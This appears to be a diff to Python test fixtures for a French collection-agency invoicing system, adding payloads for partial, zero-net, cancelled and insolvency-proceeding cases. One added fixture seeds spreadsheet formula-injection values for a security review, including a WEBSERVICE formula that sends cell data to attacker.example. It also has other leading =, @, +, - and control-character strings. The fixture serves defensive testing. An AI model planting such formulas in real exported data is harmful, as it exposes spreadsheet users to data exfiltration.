@@ -54,7 +54,7 @@ COLUMNS = [
     "line_no", "mandate", "portfolio", "file", "debtor", "items", "components", "nature",
     "nature_reason", "from_run", "encaissement_date", "effective_date", "deadline", "amount_minor",
     "rules", "rates", "basis_minor", "commission_minor", "commission_state", "invoice", "receipt",
-    "late", "late_reason",
+    "late", "late_cause",
 ]  # fmt: skip
 
 
@@ -84,7 +84,7 @@ def _line(  # noqa: PLR0913, PLR0917 - a fixture row
         "invoice": "FC-2026-000003",
         "receipt": f"Q-2026-{no:06d}",
         "late": False,
-        "late_reason": None,
+        "late_cause": None,
     }
     v.update(kw)
     return [v[c] for c in COLUMNS]
@@ -114,7 +114,7 @@ def statement_payload() -> dict[str, Any]:
             50_000,
             7_500,
             late=True,
-            late_reason="IBAN du mandant à confirmer",
+            late_cause="approved_late",
             encaissement_date="2026-09-30",
             effective_date="2026-09-30",
             deadline="2026-10-30",
@@ -182,6 +182,7 @@ def statement_payload() -> dict[str, Any]:
         "exponent": 2,
         "status": "approved",
         "cancelled_on": None,
+        "settled_on": None,
         "issuer": copy.deepcopy(SELLER),
         "client": copy.deepcopy(BUYER),
         "mandates": [
@@ -199,6 +200,7 @@ def statement_payload() -> dict[str, Any]:
             "line_count": 5,
             "repriced_count": 1,
             "file_count": 3,
+            "repriced_only_file_count": 0,
             "collected_minor": "263345",
             "reversed_minor": "-20000",
             "commission_ht_minor": "35700",
@@ -293,9 +295,12 @@ def statement_payload() -> dict[str, Any]:
                     "mode": "run",
                     "run_number": "RV-2026-000002",
                     "execution_date": "2026-11-03",
+                    "transfer": True,
+                    "amount_minor": "46440",
                 },
                 "own_account": None,
                 "corrects": [],
+                "cancelled_by": [],
                 "settles_minor": "46440",
             },
             {
@@ -316,8 +321,11 @@ def statement_payload() -> dict[str, Any]:
                     "mode": "run",
                     "run_number": "RV-2026-000002",
                     "execution_date": "2026-11-03",
+                    "transfer": True,
+                    "amount_minor": "0",
                 },
                 "own_account": None,
+                "cancelled_by": [],
                 "corrects": [
                     {
                         "number": "FC-2026-000001",
@@ -453,13 +461,15 @@ def invoice_payload(**over: Any) -> dict[str, Any]:
             "mode": "run",
             "run_number": "RV-2026-000002",
             "execution_date": "2026-11-03",
+            "transfer": True,
+            "amount_minor": "46440",
         },
         "own_account": None,
         "penalty_text": (
             "Pénalités de retard : taux d'intérêt appliqué par la Banque centrale européenne à son "
             "opération de refinancement la plus récente, majoré de 10 points de pourcentage."
         ),
-        "flat_indemnity": {"applies": True, "amount_minor": "4000"},
+        "flat_indemnity": {"applies": True, "amount_minor": "4000", "proceeding": None},
         "vat_on_debits": False,
         "reason": "commission",
     }
@@ -521,3 +531,134 @@ CREDIT_REFS = {
     "c0000000-0000-0000-0000-000000000001": {"number": "FC-2026-000001", "issue_date": "2026-10-20"}
 }
 ISSUE = date(2026, 11, 2)
+
+
+# -- review fixes (M2c-5 review) -----------------------------------------------------------------
+
+
+def hostile_statement_payload() -> dict[str, Any]:
+    """Boarded text a spreadsheet would run as a formula (review security#0): a debtor, a file
+    reference, a mandate and a portfolio starting with = @ + -, a tab and a carriage return."""
+    p = statement_payload()
+    cols = {name: i for i, name in enumerate(COLUMNS)}
+    first = p["lines"][0]
+    first[cols["debtor"]] = '=WEBSERVICE("https://attacker.example/?"&B2)'
+    first[cols["file"]] = "@SUM(1+1)"
+    first[cols["mandate"]] = "+1+cmd"
+    first[cols["portfolio"]] = "-2+3"
+    second = p["lines"][1]
+    second[cols["debtor"]] = "\tTAB SARL"
+    second[cols["file"]] = "\rCR-1"
+    return p
+
+
+def partial_invoice_payload() -> dict[str, Any]:
+    """FC-2026-000003 of which the plan sets off 200,00 € on RV-2026-000002 (older invoices taken
+    first): the remainder on the next run by its latest date (review legal#4)."""
+    return invoice_payload(
+        due_date="2026-12-02",
+        payment_reference={
+            "mode": "run",
+            "run_number": "RV-2026-000002",
+            "execution_date": "2026-11-03",
+            "transfer": True,
+            "amount_minor": "20000",
+            "remainder_minor": "26440",
+            "latest_date": "2026-12-02",
+        },
+    )
+
+
+def partial_statement_payload() -> dict[str, Any]:
+    p = statement_payload()
+    doc = p["documents"][0]
+    doc["settles_minor"] = "20000"
+    doc["due_date"] = "2026-12-02"
+    doc["payment_reference"] = copy.deepcopy(partial_invoice_payload()["payment_reference"])
+    return p
+
+
+def zero_net_invoice_payload() -> dict[str, Any]:
+    """A run that transfers nothing (N = 0): its plan posted at approval (review legal#5)."""
+    return invoice_payload(
+        payment_reference={
+            "mode": "run",
+            "run_number": "RV-2026-000002",
+            "execution_date": "2026-11-02",
+            "transfer": False,
+            "amount_minor": "46440",
+        },
+    )
+
+
+def zero_net_statement_payload() -> dict[str, Any]:
+    p = statement_payload()
+    p["status"], p["settled_on"], p["payout"], p["requested_execution_date"] = (
+        "booked",
+        "2026-11-02",
+        None,
+        None,
+    )
+    p["totals"]["net_minor"] = "0"
+    p["documents"][0]["payment_reference"] = copy.deepcopy(
+        zero_net_invoice_payload()["payment_reference"]
+    )
+    return p
+
+
+def cancelled_statement_payload() -> dict[str, Any]:
+    """RV-2026-000002 cancelled before its statement was drawn (review legal#2, figures#0): its
+    invoice annulled by the cancellation's credit note, nothing set off, the gross still owed."""
+    p = statement_payload()
+    p["status"], p["cancelled_on"] = "cancelled", "2026-11-03"
+    p["payout"]["status"] = "cancelled"
+    for d in p["documents"]:
+        d["settles_minor"] = "0"
+    p["documents"][0]["cancelled_by"] = [{"number": "FC-2026-000005", "issue_date": "2026-11-03"}]
+    p["documents"].append(
+        {
+            "id": "d0000000-0000-0000-0000-000000000005",
+            "kind": "credit_note",
+            "number": "FC-2026-000005",
+            "issue_date": "2026-11-03",
+            "reason": "run_cancelled",
+            "mandate": "MAND-MARTIN-2026",
+            "ht_minor": "-38700",
+            "vat_minor": "-7740",
+            "ttc_minor": "-46440",
+            "vat_rate": None,
+            "settlement": "netted",
+            "due_date": None,
+            "clause_ref": None,
+            "payment_reference": None,
+            "own_account": None,
+            "corrects": [
+                {
+                    "number": "FC-2026-000003",
+                    "issue_date": "2026-11-02",
+                    "ht_minor": "-38700",
+                    "vat_minor": "-7740",
+                }
+            ],
+            "cancelled_by": [],
+            "settles_minor": "0",
+        }
+    )
+    p["earlier_settled"] = []
+    p["position"].update(
+        owed_after_minor=p["position"]["owed_before_minor"], receivable_after_minor="10400"
+    )
+    return p
+
+
+def proceeding_invoice_payload() -> dict[str, Any]:
+    """A professional buyer with a proceeding recorded before the issue: the 40 € is still stated
+    (L441-9 I; review legal#0), the proceeding kept for the dunning step."""
+    return invoice_payload(
+        number="FC-2026-000006",
+        flat_indemnity={
+            "applies": True,
+            "amount_minor": "4000",
+            "proceeding": {"kind": "proceeding_opened", "effective_date": "2026-10-01"},
+        },
+    )
